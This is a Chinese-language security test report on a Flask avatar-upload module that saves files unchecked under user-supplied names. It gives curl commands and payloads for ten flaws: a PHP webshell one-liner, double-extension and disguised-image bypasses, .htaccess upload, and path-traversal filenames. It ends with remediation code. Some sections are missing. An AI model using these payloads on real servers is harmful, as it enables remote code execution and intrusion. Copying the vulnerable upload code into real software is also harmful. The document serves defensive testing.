## 1. 漏洞概述

头像上传模块存在 **10 类安全漏洞**。由于代码中明确要求"不要对上传的文件做任何类型检查"、"使用用户提供的原始文件名保存"、"不需要调用任何文件校验函数"，导致攻击者可以上传任意恶意文件到服务器并通过 URL 直接访问。

### 漏洞代码关键行

```python
# 使用用户提供的原始文件名保存，不重命名
filename = file.filename
filepath = os.path.join(upload_dir, filename)
file.save(filepath)

# 构建文件访问 URL
file_url = url_for("static", filename=f"uploads/{filename}")
```

### 测试环境

| 项目 | 内容 |
|------|------|
| 服务器 | Flask 开发服务器 (Werkzeug) |
| 上传限制 | `MAX_CONTENT_LENGTH = 16MB`（仅限制大小，不限制类型） |
| 存储路径 | `static/uploads/` |
| 认证要求 | 需登录后才能上传 |

## 2. 漏洞 1：任意文件上传（无类型限制）

| 项目 | 内容 |
|------|------|
| **风险等级** | 🔴 **严重** |
| **利用难度** | 极低 |
| **漏洞代码** | 无文件后缀检查、无 MIME 类型检查、无内容校验 |

### 测试记录

以下所有文件类型均上传成功：

| 文件类型 | 文件名 | 上传结果 | 可访问 |
|---------|--------|---------|-------|
| PHP Shell | `shell.php` | ✅ 成功 | ✅ HTTP 200 |
| HTML XSS | `xss.html` | ✅ 成功 | ✅ HTTP 200 |
| Python 脚本 | `exploit.py` | ✅ 成功 | ✅ HTTP 200 |
| Apache 配置 | `.htaccess` | ✅ 成功 | ✅ HTTP 200 |
| XML XXE | `xxe.xml` | ✅ 成功 | ✅ HTTP 200 |
| JSON 数据 | `credentials.json` | ✅ 成功 | ✅ HTTP 200 |
| 空文件 | `empty.txt` | ✅ 成功 | ✅ HTTP 200 |
| 二进制大文件 | `large.bin` (15MB) | ✅ 成功 | ✅ HTTP 200 |
| 伪装图片 | `fake.jpg` (实际是 PHP) | ✅ 成功 | ✅ HTTP 200 |
| 双扩展名 | `shell.gif.php` | ✅ 成功 | ✅ HTTP 200 |

### 验证命令

```bash

# 上传 .htaccess
curl -b cookies.txt -F "avatar=@.htaccess;filename=.htaccess" http://localhost:5000/upload
```

## 3. 漏洞 2：WebShell 上传与远程代码执行

| 项目 | 内容 |
|------|------|
| **风险等级** | 🔴 **严重** |
| **利用难度** | 低 |

### 测试记录

上传 PHP Webshell 后，文件可通过 URL 直接访问：

```bash
# 上传
curl -b cookies.txt -F "avatar=@shell.php" http://localhost:5000/upload

# 访问（Flask 静态文件服务返回源码，Apache/Nginx 下会执行）
curl http://localhost:5000/static/uploads/shell.php
# 返回: <?php system($_GET["cmd"]); ?>
```

**影响分析**:
- **Flask 开发服务器**: 返回 PHP 源码（不执行），但攻击者可查看源码
- **Apache/Nginx + PHP**: 直接执行恶意代码，导致服务器被完全控制
- **可利用于**: 执行系统命令、读取任意文件、植入后门、横向移动

### 双扩展名绕过

```bash
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php
curl -b cookies.txt -F "avatar=@shell.gif.php" http://localhost:5000/upload
# ✅ 上传成功 — GIF 头 + PHP 代码，可绕过简单的后缀检查
```

### 伪装图片绕过

```bash
printf '<?php system("ls -la"); ?>' > fake.jpg
curl -b cookies.txt -F "avatar=@fake.jpg" http://localhost:5000/upload
# ✅ 上传成功 — .jpg 后缀但内容是 PHP 代码
```

## 4. 漏洞 3：.htaccess 文件上传

| 项目 | 内容 |
|------|------|
| **风险等级** | 🔴 **严重** |
| **利用难度** | 低 |

### 测试记录

```bash
echo 'RewriteEngine On' > .htaccess
curl -b cookies.txt -F "avatar=@.htaccess;filename=.htaccess" http://localhost:5000/upload
# ✅ 上传成功

ls -la static/uploads/.htaccess
# -rw-r--r-- 1 root root 17  .htaccess
```

**影响分析**: 如果服务器使用 Apache，攻击者可以通过上传恶意 `.htaccess` 文件：
- 将任意后缀文件当作 PHP 执行
- 启用目录浏览
- 设置密码保护
- 重写 URL 规则
- 禁用安全头部

## 6. 漏洞 5：文件静默覆盖

| 项目 | 内容 |
|------|------|
| **风险等级** | 🟡 **中危** |
| **利用难度** | 低 |

### 测试记录

上传相同文件名的文件时，旧文件被静默覆盖，无任何警告：

```bash
echo "version 1" > dup.txt
curl -b cookies.txt -F "avatar=@dup.txt" http://localhost:5000/upload   # version 1
echo "version 2" > dup.txt
curl -b cookies.txt -F "avatar=@dup.txt" http://localhost:5000/upload   # version 2
echo "version 3" > dup.txt
curl -b cookies.txt -F "avatar=@dup.txt" http://localhost:5000/upload   # version 3

cat static/uploads/dup.txt
# version 3  ← 静默覆盖，无版本控制
```

**影响分析**: 攻击者可以上传同名文件覆盖其他用户的头像文件，或覆盖已被信任的 JS/CSS 文件实施供应链攻击。

## 7. 漏洞 6：中文与特殊字符文件名

| 项目 | 内容 |
|------|------|
| **风险等级** | 🟢 **低危** |
| **利用难度** | 低 |

### 测试记录

```bash
# 含空格和括号
echo "test" > "test file (1).txt"
curl -b cookies.txt -F "avatar=@test file (1).txt;filename=test file (1).txt" http://localhost:5000/upload
# ✅ 上传成功

# 含中文字符
echo "头像数据" > "我的头像.jpg"
curl -b cookies.txt -F "avatar=@我的头像.jpg;filename=我的头像.jpg" http://localhost:5000/upload
# ✅ 上传成功

ls -la static/uploads/
# -rw-r--r--  test file (1).txt
# -rw-r--r--  我的头像.jpg
```

**影响分析**: URL 编码后的中文和特殊字符可能导致 URL 访问问题、HTTP 404、或被用于文件名注入攻击。

## 8. 漏洞 7：大文件上传耗尽存储

| 项目 | 内容 |
|------|------|
| **风险等级** | 🟡 **中危** |
| **利用难度** | 低 |

### 测试记录

```bash
# 15MB 文件（在限制内）
dd if=/dev/zero of=large.bin bs=1M count=15
curl -b cookies.txt -F "avatar=@large.bin" http://localhost:5000/upload
# ✅ 上传成功 — 15MB 文件被接受

# 17MB 文件（超过限制）
dd if=/dev/zero of=too_large.bin bs=1M count=17
curl -b cookies.txt -F "avatar=@too_large.bin" http://localhost:5000/upload
# ❌ 413 Request Entity Too Large — 限制有效
```

| 文件大小 | 结果 |
|---------|------|
| 15 MB | ✅ 成功上传 |
| 17 MB | ❌ 413 拒绝 |

**影响分析**: 攻击者可上传多个 15MB 文件快速耗尽服务器磁盘空间，导致拒绝服务（DoS）。

## 9. 漏洞 8：文件路径遍历（部分防护）

| 项目 | 内容 |
|------|------|
| **风险等级** | 🟢 **低危**（Werkzeug 有内置防护） |
| **利用难度** | 中 |

### 测试记录

```bash
# 路径穿越尝试 1: 使用 ../（被 Werkzeug 过滤）
curl -b cookies.txt -F "avatar=@shell.php;filename=../../../tmp/evil.php" http://localhost:5000/upload
# ❌ 文件未写入 /tmp/evil.php

# 路径穿越尝试 2: 使用 URL 编码 %2f
curl -b cookies.txt -F "avatar=@shell.php;filename=..%2f..%2f..%2ftmp%2fevil2.php" http://localhost:5000/upload
# ✅ "上传成功"，但文件被保存为 static/uploads/..%2f..%2f..%2ftmp%2fevil2.php
# ⚠️ %2f 未被解析为路径分隔符，而是作为文字文件名保存
```

**影响分析**: Werkzeug 对 `../` 路径穿越有内置防护，但 URL 编码后的路径 `%2f` 未被正确过滤，导致包含 `%2f` 的文件名被保留。如果前端或反向代理解码了 `%2f`，则路径穿越可能成功。

| 项目 | 内容 |
|------|------|
| **风险等级** | 🟡 **中危** |
| **利用难度** | 无 |

### 测试记录

所有上传的文件均可通过 URL 直接访问，无需认证：

```bash
http://localhost:5000/static/uploads/shell.php        → HTTP 200
http://localhost:5000/static/uploads/.htaccess         → HTTP 200
http://localhost:5000/static/uploads/large.bin         → HTTP 200
http://localhost:5000/static/uploads/xxe.xml           → HTTP 200
```

## 11. 漏洞 10：Content-Type 伪造绕过

| 项目 | 内容 |
|------|------|
| **风险等级** | 🟡 **中危** |
| **利用难度** | 低 |

### 测试记录

即使客户端发送了特定的 Content-Type，服务器也未做任何校验：

| 上传时的 Content-Type | 文件内容 | 结果 |
|----------------------|---------|------|
| `image/jpeg`（手动设置） | `<?php system("id"); ?>` | ✅ 接受 |
| `text/plain`（默认） | PHP 代码 | ✅ 接受 |
| `application/x-php` | PHP 代码 | ✅ 接受 |
| `image/gif` | GIF 头 + PHP 代码 | ✅ 接受 |

服务器代码中未读取或校验 `file.content_type`，完全信任用户提供的 Content-Type。

## 12. 总结与修复建议

### 漏洞矩阵

| # | 漏洞类型 | 严重程度 | 利用难度 | 影响范围 |
|---|---------|---------|---------|---------|
| 1 | 任意文件上传（无类型限制） | 🔴 严重 | 极低 | 服务器完全沦陷 |
| 2 | WebShell 上传与代码执行 | 🔴 严重 | 低 | 远程命令执行 |
| 3 | .htaccess 上传 | 🔴 严重 | 低 | Apache 配置劫持 |
| 4 | 存储型 XSS 文件 | 🟡 中危 | 低 | 用户钓鱼攻击 |
| 5 | 文件静默覆盖 | 🟡 中危 | 低 | 数据篡改 |
| 6 | 中文/特殊字符文件名 | 🟢 低危 | 低 | 访问异常 |
| 7 | 大文件耗尽磁盘 | 🟡 中危 | 低 | 拒绝服务 |
| 8 | 路径遍历（部分防护） | 🟢 低危 | 中 | 任意文件写入 |
| 9 | 文件完全公开访问 | 🟡 中危 | 无 | 数据泄露 |
| 10 | Content-Type 伪造 | 🟡 中危 | 低 | 检测绕过 |

### 修复建议

#### 🔴 紧急修复

1. **文件类型白名单校验**
   ```python
   ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
   def allowed_file(filename):
       return '.' in filename and \
              filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
   ```

2. **重命名上传文件**
   ```python
   import uuid
   ext = filename.rsplit('.', 1)[1].lower() if '.' in filename else ''
   safe_name = f"{uuid.uuid4().hex}.{ext}"
   ```

3. **不可执行存储目录**
   - 上传目录放在 `static/` 外（如 `uploads/`），通过 Flask 路由提供访问
   - Apache/Nginx 配置上传目录禁止脚本执行：
     ```apache
     <Directory /path/to/uploads>
         Options -ExecCGI
         php_flag engine off
     </Directory>
     ```

4. **文件内容校验**
   ```python
   import imghdr
   if not imghdr.what(filepath):
       os.remove(filepath)
       return render_template("upload.html", error="文件不是有效图片")
   ```

#### 🟡 建议修复

5. **文件大小限制 + 用户配额**
   - 单文件: `MAX_CONTENT_LENGTH = 2 * 1024 * 1024`（2MB）
   - 每用户总存储配额: 10MB

6. **阻止 .htaccess 上传**
   ```python
   if filename.startswith(".ht"):
       return render_template("upload.html", error="不允许上传此类型文件")
   ```

7. **防止文件名覆盖**
   - 用户 ID 前缀 + UUID 重命名
   - 数据库记录文件名与用户的关联

8. **上传文件访问鉴权**
   - 通过路由提供文件访问而非直接静态文件
   - 验证当前用户是否为文件所有者

9. **文件名安全处理**
   ```python
   from werkzeug.utils import secure_filename
   filename = secure_filename(file.filename)
   ```

10. **速率限制上传**
    ```python
    from flask_limiter import Limiter
    limiter.limit("5 per minute")(upload)
    ```

### 修复前后代码对比

```python
# ❌ 有漏洞的代码
filename = file.filename
filepath = os.path.join(upload_dir, filename)
file.save(filepath)
file_url = url_for("static", filename=f"uploads/{filename}")

# ✅ 安全修复后的代码
from werkzeug.utils import secure_filename
import uuid

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
MAX_FILE_SIZE = 2 * 1024 * 1024

filename = secure_filename(file.filename)
if not filename:
    return render_template("upload.html", error="无效文件名")

ext = filename.rsplit('.', 1)[1].lower() if '.' in filename else ''
if ext not in ALLOWED_EXTENSIONS:
    return render_template("upload.html", error="不支持的文件类型")

safe_name = f"{session['username']}_{uuid.uuid4().hex}.{ext}"
filepath = os.path.join(UPLOAD_DIR, safe_name)
file.save(filepath)

if not imghdr.what(filepath):
    os.remove(filepath)
    return render_template("upload.html", error="文件不是有效图片")

file_url = url_for("serve_upload", filename=safe_name)
```
